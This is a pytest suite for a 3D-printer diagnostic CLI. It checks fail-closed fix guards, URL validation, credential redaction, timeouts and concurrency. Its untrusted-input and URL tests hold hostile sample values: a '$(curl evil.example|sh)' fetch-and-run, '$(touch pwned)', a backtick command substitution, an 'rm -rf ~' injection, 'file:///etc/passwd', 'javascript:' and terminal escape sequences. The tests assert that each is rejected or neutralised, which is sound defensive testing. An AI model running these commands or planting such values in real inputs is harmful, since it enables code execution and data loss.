"""Hardening of `3d printers doctor` found by review: fail-closed guards, access, URL schemes, unexpected
exceptions, unconfirmed fixes, secret redaction, untrusted printer-supplied text, dead hosts costing one
timeout, concurrent printers. Loopback fakes and injected transports only."""

from __future__ import annotations

import datetime
import json
import threading
from collections.abc import Mapping
from pathlib import Path
from typing import Any

import pytest
from printer_doctor import render
from printer_doctor.checks._common import human_bytes, origin_of, safe_http_url
from printer_doctor.checks.spoolman import _cors_steps, _link_steps
from printer_doctor.context import (
    Context,
    DownTracker,
    HttpReply,
    Services,
    default_http,
    endpoint,
)
from printer_doctor.engine import Options, evaluate, run_printer, summarize
from printer_doctor.model import (
    CannotSee,
    Check,
    CheckResult,
    Fix,
    FixChange,
    PrinterReport,
    ResultRecord,
    Risk,
    Severity,
    FixReport,
    Verdict,
    clean,
    command,
)
from printer_doctor.registry import discover_checks
from printer_doctor_fakes import (
    JPEG,
    FakeApi,
    FakeCameraServer,
    ManualClock,
    ev,
    printer_view,
    rig,
    subscription_sources,
    target,
)
from printer_fakes import FakeMoonraker, free_port
from printer_ops.base import PrinterCommError
from printer_ops.webui import WebUi, WebUiProbe
from printops.client import ApiClient, ApiError, Response

CHECKS = {c.id: c for c in discover_checks()}
NOW = 1_800_000_000.0


def run_one(cid: str, r: Any, options: Options | None = None) -> Any:
    return run_printer(r.ctx, [CHECKS[cid]], options or Options()).records[0]


# ---- 2. the never-mid-print guard fails closed for the safe fix -----------------------------


@pytest.mark.parametrize("code", [401, 500, 503])
def test_active_spool_fix_is_refused_when_the_print_state_cannot_be_read(
    code: int,
) -> None:
    moon = FakeMoonraker(
        spoolman=True, components=["spoolman"], active_spool=2, query_error=code
    )
    api = FakeApi(routes={"/v1/printers/p1": printer_view("p1", bound={0: [5]})})
    with moon.serve():
        r = rig(target(port=moon.port), api=api.client())
        rec = run_one("active-spool-binding", r, Options(fix=True))
    assert rec.fix is not None and not rec.fix.applied
    assert rec.fix.error and rec.fix.error.startswith(
        "refused: cannot tell whether a job is running"
    )
    assert moon.writes() == [] and moon.active_spool == 2 and r.journal == []


def test_klippy_fix_still_treats_an_unreadable_print_state_as_idle_because_klipper_is_down() -> (
    None
):
    moon = FakeMoonraker(
        server_info={"klippy_connected": False, "klippy_state": "disconnected"},
        services={"klipper": True},
    )
    with moon.serve():
        rec = run_one(
            "klippy-state", rig(target(port=moon.port)), Options(fix=True, yes=True)
        )
    assert (
        rec.result.status == "pass" and rec.fix is not None and rec.fix.verified is True
    )


# ---- 3. only access: full is ever written to ------------------------------------------------


def test_fix_yes_on_a_read_only_printer_in_shutdown_sends_nothing() -> None:
    moon = FakeMoonraker(
        server_info={"klippy_connected": True, "klippy_state": "shutdown"}
    )
    with moon.serve():
        r = rig(target(port=moon.port, access="read-only"))
        rec = run_one("klippy-state", r, Options(fix=True, yes=True))
    assert rec.fix is not None and not rec.fix.applied
    assert rec.fix.error and rec.fix.error.startswith("refused: access read-only")
    assert moon.writes() == [] and r.journal == []
    assert (
        rec.result.status == "fail" and rec.fix.manual_steps
    )  # the steps are still printed


def test_safe_fix_is_refused_on_a_read_only_printer_too_and_works_on_a_full_one() -> (
    None
):
    api = FakeApi(routes={"/v1/printers/p1": printer_view("p1", bound={0: [5]})})
    moon = FakeMoonraker(spoolman=True, components=["spoolman"], active_spool=2)
    with moon.serve():
        rec = run_one(
            "active-spool-binding",
            rig(target(port=moon.port, access="read-only"), api=api.client()),
            Options(fix=True),
        )
        assert (
            rec.fix is not None
            and rec.fix.error
            and "access read-only" in rec.fix.error
        )
        assert moon.writes() == [] and moon.active_spool == 2
        rec = run_one(
            "active-spool-binding",
            rig(target(port=moon.port), api=api.client()),
            Options(fix=True),
        )
    assert rec.result.status == "pass" and moon.active_spool == 5


# ---- 4. URL schemes and origins --------------------------------------------------------------


def test_endpoint_honours_the_scheme_and_default_ports() -> None:
    assert endpoint("http://Host.Example/x") == ("http", "host.example", 80)
    assert endpoint("https://host.example/x") == ("https", "host.example", 443)
    assert endpoint("http://h:7912/") == ("http", "h", 7912)
    for bad in (
        "ftp://h/",
        "file:///etc/passwd",
        "gopher://h",
        "http:///nohost",
        "http://h:99999/",
    ):
        with pytest.raises(OSError):
            endpoint(bad)


def test_default_http_speaks_tls_for_https_urls_instead_of_cleartext() -> None:
    """A plain-HTTP server answers 200 to a cleartext GET; an https URL pointed at it must NOT get that
    answer (the old code sent the cleartext request regardless of the scheme)."""
    from printer_fakes import FakeWebServer

    web = FakeWebServer()
    with web.serve():
        assert (
            default_http("GET", f"http://127.0.0.1:{web.port}/", None, None, 3.0).status
            == 200
        )
        with pytest.raises(OSError):
            default_http("GET", f"https://127.0.0.1:{web.port}/", None, None, 3.0)
        assert web.requests == ["/"]  # the TLS hello was not an HTTP request
    with pytest.raises(OSError, match="unsupported URL scheme"):
        default_http("GET", "ftp://127.0.0.1/", None, None, 1.0)


@pytest.mark.parametrize(
    ("url", "origin"),
    [
        ("http://p.lan:80/", "http://p.lan"),
        ("http://p.lan/", "http://p.lan"),
        ("https://p.lan:443/x", "https://p.lan"),
        ("http://p.lan:4408/", "http://p.lan:4408"),
        ("https://p.lan:80/", "https://p.lan:80"),
        ("http://[fd00::1]:80/", "http://[fd00::1]"),
        ("ftp://p.lan/", None),
        ("http://p.lan:99999/", None),
    ],
)
def test_origin_drops_a_default_port_like_a_browser(
    url: str, origin: str | None
) -> None:
    assert origin_of(url) == origin


def test_cors_check_compares_the_origin_a_browser_sends_when_the_ui_probe_reports_port_80() -> (
    None
):
    """The web-UI probe reports `http://HOST:80/`; the browser's Origin is `http://HOST`. Spoolman admits
    that one: the check must pass and its manual steps must never ask for a `:80` origin."""
    moon = FakeMoonraker(
        components=["spoolman"],
        config={"spoolman": {"server": "http://spool.lan:7912"}},
        spoolman=True,
    )
    seen: list[str | None] = []

    def http(
        method: str,
        url: str,
        headers: Mapping[str, str] | None,
        body: bytes | None,
        timeout: float,
    ) -> HttpReply:
        if "spool.lan" in url:
            origin = (headers or {}).get("Origin")
            seen.append(origin)
            admitted = (
                {"Access-Control-Allow-Origin": origin}
                if origin == "http://ui.lan"
                else {}
            )
            return HttpReply(200, {k.lower(): v for k, v in admitted.items()}, b"{}")
        return default_http(method, url, headers, body, timeout)

    ui = WebUiProbe(found=[WebUi("http://ui.lan:80/", "Fluidd", None, 200)])
    with moon.serve():
        rec = run_one(
            "spoolman-cors", rig(target(port=moon.port), http=http, webui=lambda d: ui)
        )
        assert rec.result.status == "pass" and seen == ["http://ui.lan"]
        ui = WebUiProbe(found=[WebUi("http://other.lan:80/", "Fluidd", None, 200)])
        rec = run_one(
            "spoolman-cors", rig(target(port=moon.port), http=http, webui=lambda d: ui)
        )
    assert rec.result.status == "fail" and ev(rec.result)["missing"] == [
        "http://other.lan"
    ]
    assert rec.fix is not None and not any(":80" in s for s in rec.fix.manual_steps)


# ---- 5. nothing unexpected aborts the run -----------------------------------------------------


def _fixable(apply: Any, steps: Any = None, risk: Risk = "safe") -> Check:
    return Check(
        "fixable",
        "t",
        "warn",
        "x",
        lambda _c: Verdict.fail("broken", "warn"),
        fix=Fix(risk, "d", steps or (lambda _c, _r: ["by hand"]), apply),
    )


def test_an_unexpected_exception_in_a_fix_becomes_a_per_fix_error_and_the_run_goes_on() -> (
    None
):
    def boom(_ctx: Context, _res: CheckResult) -> FixChange:
        raise ValueError("adapter returned garbage")

    after = Check("after", "t", "info", "x", lambda _c: Verdict.ok("still evaluated"))
    r = rig(target())
    report = run_printer(r.ctx, [_fixable(boom), after], Options(fix=True))
    first, second = report.records
    assert (
        first.fix is not None
        and first.fix.error == "failed: ValueError: adapter returned garbage"
    )
    assert not first.fix.applied and r.journal == []
    assert second.result.status == "pass"


def test_a_crashing_manual_steps_function_does_not_lose_the_report() -> None:
    def steps(_c: Context, _r: CheckResult) -> list[str]:
        raise RuntimeError("systemctl exploded")

    rec = run_printer(
        rig(target()).ctx, [_fixable(None, steps, "manual-only")], Options()
    ).records[0]
    assert rec.fix is not None and rec.fix.manual_steps == [
        "(manual steps unavailable: RuntimeError: systemctl exploded)"
    ]


def test_a_journal_that_raises_after_the_write_still_reports_the_fix() -> None:
    """The restart/spool write already happened: a broken journal must not turn it into a traceback."""

    def apply(_ctx: Context, _res: CheckResult) -> FixChange:
        return FixChange(1, 2)

    state = {"healed": False}

    def run(_ctx: Context) -> Verdict:
        return Verdict.ok("fine") if state["healed"] else Verdict.fail("broken", "warn")

    def heal(_ctx: Context, _res: CheckResult) -> FixChange:
        state["healed"] = True
        return FixChange(1, 2)

    check = Check(
        "heal", "t", "warn", "x", run, fix=Fix("safe", "d", lambda _c, _r: [], heal)
    )

    def bad_journal(entry: Any, api: Any) -> str:
        raise RuntimeError("disk on fire")

    svc = Services(sleep=lambda s: None, api=lambda: None, journal=bad_journal)
    report = run_printer(Context(target(), svc), [check], Options(fix=True))
    fix = report.records[0].fix
    assert fix is not None and fix.applied and fix.verified is True
    assert fix.journal == "failed: RuntimeError: disk on fire"


def test_journal_buffers_when_the_api_client_cannot_even_be_built(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))

    def broken_api() -> ApiClient:
        raise RuntimeError("printops.yaml is unreadable")

    from printer_doctor.journal import JournalEntry

    ctx = Context(target(), Services(api=broken_api))
    assert ctx.journal(JournalEntry("p1", "c", "safe", 1, 2)) == "buffered"
    assert (tmp_path / "3d-cli" / "printer-history" / "p1.jsonl").is_file()


def test_journal_import_answered_with_non_json_is_buffered_not_a_crash(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from printer_doctor.journal import JournalEntry, record

    class Html:
        def request(
            self,
            method: str,
            url: str,
            headers: Mapping[str, str],
            body: bytes | None,
            timeout: float,
        ) -> Response:
            return Response(200, b"<html>captive portal</html>", {})

        def stream_lines(
            self, url: str, headers: Mapping[str, str], timeout: float
        ) -> Any:
            raise NotImplementedError

    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    assert (
        record(
            JournalEntry("p1", "c", "safe", 1, 2), ApiClient("http://x", "t", Html())
        )
        == "buffered"
    )


# ---- 6. an unconfirmed fix is still a finding ------------------------------------------------


def _flaky_check(
    after: str, severity: Severity = "error"
) -> tuple[Check, dict[str, bool]]:
    state = {"applied": False}

    def run(_ctx: Context) -> Verdict:
        if not state["applied"]:
            return Verdict.fail("broken", severity)
        if after == "skip":
            raise CannotSee("printer went away after the fix")
        if after == "error":
            raise CannotSee("HTTP 500", "error")
        return Verdict.fail("still broken", severity)

    def apply(_ctx: Context, _res: CheckResult) -> FixChange:
        state["applied"] = True
        return FixChange("a", "b")

    return Check(
        "flaky", "t", "error", "x", run, fix=Fix("safe", "d", lambda _c, _r: [], apply)
    ), state


@pytest.mark.parametrize("after", ["skip", "error", "fail"])
def test_a_fix_whose_verifying_run_cannot_confirm_it_still_counts_as_remaining(
    after: str,
) -> None:
    check, _ = _flaky_check(after)
    rep = run_printer(rig(target()).ctx, [check], Options(fix=True))
    rec = rep.records[0]
    assert rec.fix is not None and rec.fix.applied and rec.fix.verified is False
    assert rec.fix.error and rec.fix.error.startswith("not fixed after apply")
    assert rec.result.finding and rec.result.severity == "error"
    assert (
        summarize([rep], "error").remaining == 1
        and summarize([rep], "never").remaining == 0
    )


def test_an_unconfirmed_fix_keeps_the_severity_the_finding_had() -> None:
    check, _ = _flaky_check("skip", "warn")
    rep = run_printer(rig(target()).ctx, [check], Options(fix=True))
    assert rep.records[0].result.severity == "warn"
    assert (
        summarize([rep], "error").remaining == 0
        and summarize([rep], "warn").remaining == 1
    )


# ---- 7. secrets never reach the output --------------------------------------------------------


SECRETS = ("hunter2", "SECRET123")


def _everything(reports: list[PrinterReport]) -> str:
    summary = summarize(reports, "error")
    now = datetime.datetime.fromtimestamp(NOW, datetime.timezone.utc)
    return json.dumps(render.to_json(reports, summary, now)) + render.to_text(
        reports, summary
    )


def _camera_target(port: int) -> Any:
    watch = {
        "vision": {
            "camera": {
                "kind": "snapshot-url",
                "url": f"http://admin:hunter2@127.0.0.1:{port}/snap?token=SECRET123",
            }
        }
    }
    return target(watch=watch)


def test_a_credential_bearing_camera_url_never_appears_in_any_output_when_it_works() -> (
    None
):
    cam = FakeCameraServer()
    with cam.serve():
        r = rig(_camera_target(cam.port))
        report = run_printer(
            r.ctx, [CHECKS["camera-config"], CHECKS["camera-snapshot"]], Options()
        )
    assert [rec.result.status for rec in report.records] == ["pass", "pass"]
    text = _everything([report])
    assert not any(s in text for s in SECRETS) and "127.0.0.1" in text


def test_a_credential_bearing_camera_url_never_appears_when_the_camera_is_unreachable() -> (
    None
):
    r = rig(_camera_target(free_port()))
    report = run_printer(
        r.ctx, [CHECKS["camera-snapshot"]], Options(fix=True, yes=True)
    )
    assert (
        report.records[0].result.status == "fail"
        and "does not answer" in report.records[0].result.summary
    )
    text = _everything([report])
    assert not any(s in text for s in SECRETS)


def test_every_external_error_message_names_the_url_redacted() -> None:
    ctx = Context(
        target(), Services(http=lambda *a: (_ for _ in ()).throw(OSError("refused")))
    )
    with pytest.raises(CannotSee) as err:
        ctx.external("GET", "http://u:hunter2@h.example:9/p?api_key=SECRET123&x=1")
    assert (
        not any(s in err.value.reason for s in SECRETS)
        and "h.example:9" in err.value.reason
    )


# ---- 8. printer-supplied text is untrusted ----------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "safe"),
    [
        ("http://spool.lan:7912", "http://spool.lan:7912"),
        ("http://spool.lan:7912/", "http://spool.lan:7912"),
        ("https://[::1]:8000/spoolman/", "https://[::1]:8000/spoolman"),
        ("http://user:pw@spool.lan:7912/", "http://spool.lan:7912"),
        ("HTTP://Spool.LAN/", "http://spool.lan"),
        ("http://x/$(curl evil.example|sh)#", None),
        ("http://10.0.0.1/admin/reboot?x=", None),
        ("http://10.0.0.1/a#frag", None),
        ("http://h/a;b=1", None),
        ("http://h/`id`", None),
        ("ftp://h/", None),
        ("javascript:alert(1)", None),
        ("//h/x", None),
        ("http://", None),
        ("spool.lan:7912", None),
        ("http://h:99999", None),
    ],
)
def test_safe_http_url_accepts_plain_http_urls_only(raw: str, safe: str | None) -> None:
    assert safe_http_url(raw) == safe


def test_a_hostile_spoolman_server_is_never_fetched_nor_pasted_into_a_command() -> None:
    evil = "http://x.lan/$(touch pwned)?a=b"
    moon = FakeMoonraker(
        components=["spoolman"], spoolman=True, config={"spoolman": {"server": evil}}
    )
    with moon.serve():
        r = rig(target(port=moon.port))
        link = run_one("spoolman-link", r)
        cors = run_one("spoolman-cors", r)
    assert cors.result.status == "skip" and "plain http(s) URL" in cors.result.summary
    assert not [u for _, u in r.ctx.requests if "x.lan" in u]
    assert ev(link.result)["spoolman_server"] is None


def test_link_steps_without_a_known_url_print_no_curl_and_with_one_print_a_quoted_command() -> (
    None
):
    r = rig(target())
    blank = CheckResult(
        "spoolman-link", "fail", "error", "x", {"spoolman_server": None}
    )
    steps = _link_steps(r.ctx, blank)
    assert not any(s.startswith("$ ") for s in steps) and not any(
        "curl" in s for s in steps
    )
    known = CheckResult(
        "spoolman-link",
        "fail",
        "error",
        "x",
        {"spoolman_server": "http://spool.lan:7912"},
    )
    assert "$ curl -fsS http://spool.lan:7912/api/v1/health" in _link_steps(
        r.ctx, known
    )


def test_printed_commands_quote_every_interpolated_value() -> None:
    r = rig(target())
    res = CheckResult(
        "spoolman-cors", "fail", "error", "x",
        {"missing": ["http://h'; rm -rf ~ #"], "spoolman_url": "http://s.lan/api/v1/info"},
    )  # fmt: skip
    steps = _cors_steps(r.ctx, res)
    verify = [s for s in steps if s.startswith("$ curl")]
    assert verify and "'Origin: http://h'\"'\"'; rm -rf ~ #'" in verify[0]


def test_control_characters_from_the_printer_never_reach_a_rendered_summary() -> None:
    hostile = "\x1b]52;c;ZXZpbA==\x07evil\r\x1b[2J"
    moon = FakeMoonraker(failed_components=[hostile])
    with moon.serve():
        r = rig(target(port=moon.port))
        report = run_printer(r.ctx, [CHECKS["moonraker-components"]], Options())
    out = render.to_text([report], summarize([report], "error"))
    assert "\x1b" not in out and "\x07" not in out and "\r" not in out
    assert "evil" in out and "\\x1b" in out
    assert clean("a\x00b\nc") == "a\\x00b\\nc" and clean("ünïcode ok") == "ünïcode ok"


# ---- 9. print-stuck states what it measures ---------------------------------------------------


def test_print_stuck_reports_cumulative_time_without_extrusion_and_says_so() -> None:
    moon = FakeMoonraker()
    moon.status["print_stats"].update(
        state="paused",
        filename="a.gcode",
        print_duration=1000,
        total_duration=1000 + 3 * 3600,
    )
    with moon.serve():
        res = run_one("print-stuck", rig(target(port=moon.port))).result
    assert (
        res.status == "fail"
        and "in total" in res.summary
        and "not only this pause" in res.summary
    )
    assert ev(res)["not_extruding_s"] == 3 * 3600 and "paused_for_s" not in ev(res)


# ---- 10. the camera keepalive ------------------------------------------------------------------


def test_a_failed_keepalive_is_kept_in_the_evidence_and_the_camera_is_not_called_woken() -> (
    None
):
    cam = FakeCameraServer(wake_after=99)  # stays asleep (503)

    def wake(_d: Any, _s: Any) -> None:
        raise PrinterCommError("camera keepalive to 127.0.0.1:7125 failed: refused")

    with cam.serve():
        watch = {
            "vision": {
                "camera": {
                    "kind": "snapshot-url",
                    "url": f"http://127.0.0.1:{cam.port}/snap",
                    "keepalive": True,
                }
            }
        }
        res = run_one(
            "camera-snapshot", rig(target(watch=watch), wake_camera=wake)
        ).result
    assert (
        res.status == "fail"
        and "HTTP 503" in res.summary
        and "keepalive failed" in res.summary
    )
    assert ev(res)["woken_with_keepalive"] is False and "refused" in str(
        ev(res)["keepalive_error"]
    )


def test_an_unreachable_camera_is_not_woken_up() -> None:
    woken: list[int] = []
    watch = {
        "vision": {
            "camera": {
                "kind": "snapshot-url",
                "url": f"http://127.0.0.1:{free_port()}/snap",
                "keepalive": True,
            }
        }
    }
    res = run_one(
        "camera-snapshot",
        rig(target(watch=watch), wake_camera=lambda d, s: woken.append(1)),
    ).result
    assert (
        res.status == "fail"
        and woken == []
        and ev(res)["woken_with_keepalive"] is False
    )


# ---- perf: a dead host costs ONE timeout --------------------------------------------------------


class BlackHole:
    """An address that swallows connections: every call to it times out (counted)."""

    def __init__(self) -> None:
        self.http_calls: list[str] = []
        self.adapter_calls = 0
        self._lock = threading.Lock()

    def http(
        self, method: str, url: str, headers: Any, body: Any, timeout: float
    ) -> HttpReply:
        with self._lock:
            self.http_calls.append(url)
        raise TimeoutError("timed out")

    def adapter(self, device: Any) -> Any:
        hole = self

        class Dead:
            def status(self) -> Any:
                hole.adapter_calls += 1
                raise PrinterCommError(
                    f"{device.name}: GET status: timed out"
                ) from TimeoutError("timed out")

        return Dead()


def test_a_dead_printer_costs_one_timeout_not_one_per_path_or_per_check() -> None:
    hole = BlackHole()
    watch = {
        "vision": {
            "camera": {
                "kind": "snapshot-url",
                "url": "http://127.0.0.1:8080/snap",
                "keepalive": True,
            }
        }
    }
    clock = ManualClock()
    svc = Services(clock=clock, sleep=clock.sleep, http=hole.http, adapter=hole.adapter, journal=lambda e, a: "buffered",
                   webui=lambda d: (_ for _ in ()).throw(AssertionError("the web UI probe must not run against a dead host")),
                   systemctl_show=lambda u: "", api=lambda: None, timeout=8.0, subscriptions=subscription_sources())  # fmt: skip
    ctx = Context(target(watch=watch), svc)
    report = run_printer(ctx, discover_checks(), Options())
    by = {rec.result.check: rec.result for rec in report.records}
    assert len(hole.http_calls) == 1 and hole.adapter_calls == 0, hole.http_calls
    assert clock.now == NOW  # no keepalive wait loop against a dead host
    assert by["reachable"].status == "fail" and "timed out" in by["reachable"].summary
    for cid in (
        "klippy-state",
        "disk-space",
        "time-sync",
        "trusted-clients-width",
        "print-stuck",
        "webui-presence",
    ):
        assert (
            by[cid].status == "skip"
            and "unreachable" in by[cid].summary
            and "reachable" in by[cid].summary
        ), (cid, by[cid])
    assert (
        by["camera-snapshot"].status == "fail"
        and "timed out" in by["camera-snapshot"].summary
    )


def test_the_adapter_path_alone_also_marks_the_host_down() -> None:
    hole = BlackHole()
    svc = Services(http=hole.http, adapter=hole.adapter)
    ctx = Context(target(), svc)
    with pytest.raises(CannotSee):
        ctx.adapter_status()
    with pytest.raises(CannotSee):  # now every HTTP call to that host fails at once
        ctx.get("/server/info")
    assert hole.adapter_calls == 1 and hole.http_calls == []


def test_a_refused_port_marks_only_that_port_and_a_down_host_is_forgotten_after_a_success() -> (
    None
):
    calls: list[str] = []

    def http(
        method: str, url: str, headers: Any, body: Any, timeout: float
    ) -> HttpReply:
        calls.append(url)
        if ":7125" in url and len(calls) == 1:
            raise ConnectionRefusedError(111, "refused")
        return HttpReply(200, {}, JPEG if ":8080" in url else b'{"result": {}}')

    ctx = Context(target(), Services(http=http))
    with pytest.raises(CannotSee):
        ctx.get("/server/info")
    assert (
        ctx.external("GET", "http://127.0.0.1:8080/snap").reply.status == 200
    )  # camera port still tried
    with pytest.raises(CannotSee):
        ctx.get("/server/config")  # Moonraker's port: cached refusal, nothing sent
    assert calls == ["http://127.0.0.1:7125/server/info", "http://127.0.0.1:8080/snap"]
    assert (
        ctx.get("/server/info", fresh=True).reply.status == 200
    )  # a fresh read (restart poll) tries again


def test_down_tracker_separates_host_level_from_port_level_failures() -> None:
    d = DownTracker()
    d.mark("h", 1, ConnectionResetError(104, "reset"))
    assert d.reason("h", 1) and d.reason("h", 2) is None
    d.mark("g", 1, TimeoutError("timed out"))
    assert d.reason("g", 1) and d.reason("g", 2)
    d.forget("g", 1)
    assert d.reason("g", 2) is None


def test_a_dead_3d_api_costs_one_timeout_across_every_printer() -> None:
    calls: list[str] = []

    class Down:
        def request(
            self,
            method: str,
            url: str,
            headers: Mapping[str, str],
            body: bytes | None,
            timeout: float,
        ) -> Response:
            calls.append(url)
            raise ApiError("3d-api is unreachable: timed out")

        def stream_lines(
            self, url: str, headers: Mapping[str, str], timeout: float
        ) -> Any:
            raise NotImplementedError

    client = ApiClient("http://api.lan:8765", "t", Down())
    svc = Services(api=lambda: client)
    reports = [
        run_printer(
            Context(target(n), svc),
            [CHECKS["slot-binding-unknown"], CHECKS["heads-vs-faults"]],
            Options(),
        )
        for n in ("p1", "p2", "p3")
    ]
    assert len(calls) == 1
    for rep in reports:
        assert all(
            r.result.status == "skip" and "3d-api unreachable" in r.result.summary
            for r in rep.records
        )


# ---- concurrency ---------------------------------------------------------------------------------


def test_printers_run_concurrently_and_are_reported_in_the_order_given(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: Any
) -> None:
    import time

    from fleet_fixtures import k1se_moonraker_entry, u1_entry, write_fleet
    from printers_cli.doctor import run

    slow, fast = FakeMoonraker(), FakeMoonraker()
    threads: dict[int, str] = {}

    def http(
        method: str, url: str, headers: Any, body: Any, timeout: float
    ) -> HttpReply:
        threads[int(url.split(":")[2].split("/")[0])] = threading.current_thread().name
        if f":{slow.port}/" in url:
            time.sleep(0.4)  # the first printer named finishes LAST
        return default_http(method, url, headers, body, timeout)

    with slow.serve(), fast.serve():
        fleet = write_fleet(
            tmp_path / "fleet.yaml", u1_entry(fast), k1se_moonraker_entry(slow)
        )
        monkeypatch.setenv("THREED_FLEET", str(fleet))
        monkeypatch.setenv("THREED_MAX_WORKERS", "4")
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "config"))
        started = time.monotonic()
        code = run(
            ["k1se", "u1", "--check", "disk-space", "--json"],
            Services(http=http, sleep=lambda s: None),
        )
        elapsed = time.monotonic() - started
    assert code == 0
    names = [p["name"] for p in json.loads(capsys.readouterr().out)["printers"]]
    assert names == ["k1se", "u1"]
    assert len({threads[slow.port], threads[fast.port]}) == 2, threads
    assert elapsed < 0.4 * 2 + 0.3  # not serialised behind the slow one more than once


# ---- small things ---------------------------------------------------------------------------------


def test_human_bytes_scales_through_every_unit() -> None:
    assert human_bytes(512) == "512 B"
    assert human_bytes(2_500_000) == "2.5 MB"
    assert human_bytes(3.4e12) == "3.4 TB" and human_bytes(5e15) == "5000.0 TB"


def test_the_watch_units_check_asks_systemd_once_per_unit_even_when_it_prints_steps() -> (
    None
):
    asked: list[str] = []

    def show(unit: str) -> str:
        asked.append(unit)
        return (
            "LoadState=loaded\nActiveState=active\n"
            "ExecStart={ path=/usr/bin/3d ; argv[]=/usr/bin/3d printer vision p1 --dry-run ; ignore_errors=no ; pid=0 }\n"
            "EnvironmentFiles=\n"
        )

    watch = {
        "vision": {"camera": {"kind": "snapshot-url", "url": "http://127.0.0.1:1/snap"}}
    }
    rec = run_one("watch-units-dry-run", rig(target(watch=watch), systemctl_show=show))
    assert rec.fix is not None and rec.fix.manual_steps and len(asked) == 2


def test_active_spool_skips_for_a_missing_api_before_it_contacts_the_printer() -> None:
    r = rig(target(), api=None)
    res = evaluate(CHECKS["active-spool-binding"], r.ctx)
    assert (
        res.status == "skip"
        and "3d-api is not configured" in res.summary
        and r.ctx.requests == []
    )


def test_manual_steps_render_commands_with_a_dollar_and_prose_with_a_bullet_and_one_rerun_line() -> (
    None
):
    rec = ResultRecord(
        CheckResult("disk-space", "fail", "warn", "full", {}),
        FixReport(
            "manual-only",
            "free space",
            [command("df -h"), "Delete old G-code in the web UI."],
        ),
    )
    rep = PrinterReport("p1", "full", "moonraker", [rec])
    text = render.to_text([rep], summarize([rep], "error"))
    assert (
        "        $ df -h\n" in text
        and "        - Delete old G-code in the web UI.\n" in text
    )
    assert text.count("re-run: 3d printers doctor p1 --check disk-space") == 1


def test_no_shipped_check_hand_appends_a_rerun_line_to_its_steps() -> None:
    root = Path(__file__).resolve().parents[1] / "lib" / "printer_doctor" / "checks"
    for path in sorted(root.glob("*.py")):
        text = path.read_text(encoding="utf-8")
        assert (
            "Re-run" not in text
            and "Then `3d printers doctor" not in text
            and "Check the number again" not in text
        ), path.name
